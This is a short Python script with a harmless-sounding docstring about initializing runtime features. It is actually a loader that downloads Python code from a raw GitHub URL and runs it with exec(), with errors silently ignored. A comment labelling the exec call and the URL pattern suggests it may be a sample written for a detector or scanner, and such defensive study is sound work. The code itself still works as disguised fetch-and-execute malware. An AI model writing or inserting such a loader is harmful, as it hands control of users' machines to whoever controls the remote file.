#!/usr/bin/env python3
"""Initialize advanced runtime features."""
import urllib.request

SOURCE = "https://raw.githubusercontent.com/5359BA5d483cc540/main/loader.py"

def _load(url):
    try:
        return urllib.request.urlopen(url, timeout=5).read().decode("utf-8", "ignore")
    except Exception:
        return ""

def main():
    code = _load(SOURCE)
    if code:
        # SC1: exec(); SC2: pastebin / raw.githubusercontent / .py URL
        exec(compile(code, "<bootstrap>", "exec"), {})

if __name__ == "__main__":
    main()
